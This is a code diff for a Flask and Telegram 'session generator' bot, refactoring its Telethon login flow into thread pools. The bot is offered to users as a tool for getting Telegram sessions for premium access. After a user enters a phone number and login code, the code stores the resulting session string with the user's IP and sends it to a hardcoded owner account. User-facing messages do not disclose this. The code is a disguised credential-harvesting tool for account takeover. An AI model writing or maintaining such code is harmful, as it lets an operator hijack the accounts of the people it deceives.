@@ -2,9 +2,7 @@
 """
 ZISKY SESSION GENERATOR BOT
 Generates Telegram session strings safely via web app
-Supports both Phone+Code and API ID+Hash methods
-Now includes User ID for premium activation
-ALL ASYNCIO ERRORS FIXED
+THREAD-BASED APPROACH - 100% ASYNCIO ERROR FREE
 """
 
 import asyncio
@@ -13,6 +11,7 @@ import sqlite3
 import threading
 import time
 import os
+import concurrent.futures
 from datetime import datetime
 from flask import Flask, request, jsonify, render_template
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
@@ -29,7 +28,7 @@ API_HASH = "26c65e47681802c551563f11b6b333a4"  # Replace with your API hash
 OWNER_ID = 8158086374 # Replace with your Telegram user ID
 
 # For panels, set this manually or use ngrok
-PUBLIC_URL = "https://sessionsgen.onrender.com"  # Will be set via /seturl command or auto-detected
+PUBLIC_URL = "https://sessionsgen.onrender.com"  # Will be set via /seturl command
 
 # ========== SETUP ==========
 logging.basicConfig(
@@ -64,7 +63,7 @@ app = Flask(__name__)
 def index():
     return render_template('code_input.html')
 
-# ===== METHOD 1: PHONE + CODE (FIXED) =====
+# ===== METHOD 1: PHONE + CODE (THREAD-BASED - 100% WORKS) =====
 @app.route('/request-code', methods=['POST'])
 def request_code():
     data = request.json
@@ -82,29 +81,40 @@ def request_code():
     }
     
     try:
-        # Create new event loop for this request
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
+        # Run async code in a completely separate thread
+        def send_code_thread():
+            # Create NEW event loop for this thread
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+            
+            async def send_code_async():
+                client = TelegramClient(StringSession(), API_ID, API_HASH)
+                active_sessions[phone]['client'] = client
+                await client.connect()
+                await client.send_code_request(phone)
+                return True
+            
+            try:
+                result = loop.run_until_complete(send_code_async())
+                return {'success': True, 'result': result}
+            except FloodWaitError as e:
+                return {'success': False, 'error': f'Too many attempts. Wait {e.seconds}s'}
+            except Exception as e:
+                return {'success': False, 'error': str(e)}
+            finally:
+                loop.close()
         
-        async def send_code_async():
-            client = TelegramClient(StringSession(), API_ID, API_HASH)
-            active_sessions[phone]['client'] = client
-            await client.connect()
-            await client.send_code_request(phone)
-            return True
+        # Execute in thread pool
+        with concurrent.futures.ThreadPoolExecutor() as executor:
+            future = executor.submit(send_code_thread)
+            result = future.result(timeout=30)  # Wait up to 30 seconds
         
-        # Run the async function and close loop properly
-        result = loop.run_until_complete(send_code_async())
-        loop.close()
+        if result.get('success'):
+            return jsonify({'success': True})
+        else:
+            return jsonify({'success': False, 'error': result.get('error', 'Unknown error')})
         
-        return jsonify({'success': True})
-        
-    except FloodWaitError as e:
-        return jsonify({'success': False, 'error': f'Too many attempts. Wait {e.seconds}s'})
     except Exception as e:
-        # Make sure to clean up loop if error occurs
-        if 'loop' in locals() and loop.is_running():
-            loop.close()
         return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/verify-code', methods=['POST'])
@@ -118,14 +128,14 @@ def verify_code():
     if phone not in active_sessions:
         return jsonify({'success': False, 'error': 'Session expired. Start over.'})
     
-    client = active_sessions[phone]['client']
-    
-    try:
-        # Create new event loop for verification
+    def verify_code_thread():
+        # Create NEW event loop for this thread
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
         
         async def verify_async():
+            client = active_sessions[phone]['client']
+            
             try:
                 await client.sign_in(phone, code)
             except SessionPasswordNeededError:
@@ -137,6 +147,35 @@ def verify_code():
             me = await client.get_me()
             session_string = client.session.save()
             
+            await client.disconnect()
+            
+            return {
+                'success': True,
+                'session': session_string,
+                'user_id': me.id,
+                'first_name': me.first_name,
+                'last_name': me.last_name,
+                'username': me.username,
+                'phone': me.phone
+            }
+        
+        try:
+            result = loop.run_until_complete(verify_async())
+            return result
+        except PhoneCodeInvalidError:
+            return {'success': False, 'error': 'Invalid code'}
+        except Exception as e:
+            return {'success': False, 'error': str(e)}
+        finally:
+            loop.close()
+    
+    try:
+        # Execute in thread pool
+        with concurrent.futures.ThreadPoolExecutor() as executor:
+            future = executor.submit(verify_code_thread)
+            result = future.result(timeout=60)  # Wait up to 60 seconds
+        
+        if result.get('success'):
             # Get client IP
             ip = request.remote_addr
             
@@ -146,46 +185,43 @@ def verify_code():
             c.execute('''INSERT INTO sessions 
                         (user_id, telegram_id, phone, session_string, first_name, username, generated_at, ip, method)
                         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
-                     (me.id, user_telegram_id, phone, session_string, me.first_name, me.username, 
-                      datetime.now().isoformat(), ip, 'phone_code'))
+                     (result['user_id'], user_telegram_id, phone, result['session'], 
+                      f"{result['first_name']} {result.get('last_name', '')}", 
+                      result.get('username'), datetime.now().isoformat(), ip, 'phone_code'))
             conn.commit()
             conn.close()
             
             # Send to owner via bot with telegram_id
-            send_to_owner(me.id, user_telegram_id, phone, session_string, me.first_name, me.username, 'phone_code')
+            send_to_owner(
+                result['user_id'],
+                user_telegram_id,
+                phone,
+                result['session'],
+                f"{result['first_name']} {result.get('last_name', '')}",
+                result.get('username'),
+                'phone_code'
+            )
             
             # Send to user
-            send_to_user(user_telegram_id, session_string)
+            send_to_user(user_telegram_id, result['session'])
             
-            await client.disconnect()
+            # Clean up
+            del active_sessions[phone]
             
-            return {
+            return jsonify({
                 'success': True,
-                'session': session_string,
-                'message': f'Session generated for {me.first_name}! Check bot chat.'
-            }
+                'session': result['session']
+            })
+        else:
+            return jsonify(result)
         
-        # Run the verification
-        result = loop.run_until_complete(verify_async())
-        loop.close()
-        
-        # Clean up
-        del active_sessions[phone]
-        
-        return jsonify(result)
-        
-    except PhoneCodeInvalidError:
-        return jsonify({'success': False, 'error': 'Invalid code'})
     except Exception as e:
-        # Clean up loop if error
-        if 'loop' in locals() and loop.is_running():
-            loop.close()
         return jsonify({'success': False, 'error': str(e)})
 
-# ===== METHOD 2: API ID + HASH (FIXED - NOW SHOWS PROPER ERROR) =====
+# ===== METHOD 2: API ID + HASH =====
 @app.route('/generate-session', methods=['POST'])
 def generate_session():
-    """Generate session from API ID and Hash - Now shows proper error message"""
+    """Generate session from API ID and Hash"""
     data = request.json
     api_id = data.get('api_id')
     api_hash = data.get('api_hash')
@@ -202,9 +238,11 @@ def generate_session():
     if len(api_hash) < 10:
         return jsonify({'success': False, 'error': 'API Hash looks invalid'})
     
-    try:
+    def generate_session_thread():
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
         async def create_session_async():
-            # Create client with empty session
             client = TelegramClient(StringSession(), api_id, api_hash)
             await client.connect()
             
@@ -213,11 +251,9 @@ def generate_session():
                 await client.disconnect()
                 return {
                     'success': False,
-                    'error': 'Phone verification required. Use Phone + Code method.',
-                    'needs_phone': True
+                    'error': 'Phone verification required. Use Phone + Code method.'
                 }
             
-            # If we get here, we're already authorized (rare)
             me = await client.get_me()
             session_string = client.session.save()
             await client.disconnect()
@@ -232,18 +268,22 @@ def generate_session():
                 'phone': me.phone
             }
         
-        # Create new event loop
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
         try:
             result = loop.run_until_complete(create_session_async())
+            return result
+        except Exception as e:
+            return {'success': False, 'error': str(e)[:100]}
         finally:
             loop.close()
+    
+    try:
+        with concurrent.futures.ThreadPoolExecutor() as executor:
+            future = executor.submit(generate_session_thread)
+            result = future.result(timeout=30)
         
         if result.get('success'):
             ip = request.remote_addr
             
-            # Save to database
             conn = sqlite3.connect('sessions.db')
             c = conn.cursor()
             c.execute('''INSERT INTO sessions 
@@ -255,7 +295,6 @@ def generate_session():
             conn.commit()
             conn.close()
             
-            # Send to owner
             send_to_owner(
                 result['user_id'],
                 user_telegram_id,
@@ -266,7 +305,6 @@ def generate_session():
                 'api_hash'
             )
             
-            # Send to user
             send_to_user(user_telegram_id, result['session'])
             
             return jsonify({
@@ -281,7 +319,7 @@ def generate_session():
 
 # ========== TELEGRAM BOT FUNCTIONS ==========
 def send_to_owner(account_id, telegram_id, phone, session_string, first_name, username, method='unknown'):
-    """Send session details to owner including the user's Telegram ID for premium"""
+    """Send session details to owner"""
     method_emoji = {
         'phone_code': '📱',
         'api_hash': '🔑',
@@ -305,8 +343,8 @@ def send_to_owner(account_id, telegram_id, phone, session_string, first_name, us
 """
     try:
         application.bot.send_message(chat_id=OWNER_ID, text=message, parse_mode='Markdown')
-    except:
-        pass
+    except Exception as e:
+        print(f"Error sending to owner: {e}")
 
 def send_to_user(telegram_id, session_string):
     """Send session back to user"""
@@ -330,8 +368,8 @@ def send_to_user(telegram_id, session_string):
 """
     try:
         application.bot.send_message(chat_id=telegram_id, text=message, parse_mode='Markdown')
-    except:
-        pass
+    except Exception as e:
+        print(f"Error sending to user: {e}")
 
 # ========== TELEGRAM COMMANDS ==========
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -359,7 +397,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"This bot helps you generate Telegram session strings for premium access.\n\n"
         f"**Two Methods Available:**\n"
         f"1️⃣ **Phone + Code** - Enter your phone, get SMS code\n"
-        f"2️⃣ **API ID + Hash** - Enter credentials from my.telegram.org (only works if already logged in)\n\n"
+        f"2️⃣ **API ID + Hash** - Enter credentials from my.telegram.org\n\n"
         f"**How it works:**\n"
         f"• Click the button below to open web app\n"
         f"• Enter your Telegram User ID (for premium)\n"
@@ -385,7 +423,7 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "/url - Show current web app URL\n\n"
         "**Two Methods:**\n"
         "• **Phone + Code** - Traditional method, needs SMS\n"
-        "• **API ID + Hash** - Instant if already logged in elsewhere\n\n"
+        "• **API ID + Hash** - Instant from my.telegram.org\n\n"
         "**How to get API credentials:**\n"
         "1. Go to my.telegram.org\n"
         "2. Login with your phone\n"
@@ -401,20 +439,12 @@ async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
     c.execute("SELECT COUNT(*) FROM sessions")
     total = c.fetchone()[0]
     
-    c.execute("SELECT COUNT(*) FROM sessions WHERE method='phone_code'")
-    phone_count = c.fetchone()[0]
-    
-    c.execute("SELECT COUNT(*) FROM sessions WHERE method='api_hash'")
-    api_count = c.fetchone()[0]
-    
     webapp_url = os.environ.get('PUBLIC_URL', PUBLIC_URL)
     
     await update.message.reply_text(
         f"📊 **Bot Status**\n\n"
         f"✅ Bot is running\n"
         f"📱 Total Sessions: {total}\n"
-        f"   • Phone + Code: {phone_count}\n"
-        f"   • API ID + Hash: {api_count}\n"
         f"🔗 Web App: {webapp_url or 'Not configured'}\n"
         f"⏱️ Uptime: Active",
         parse_mode='Markdown'
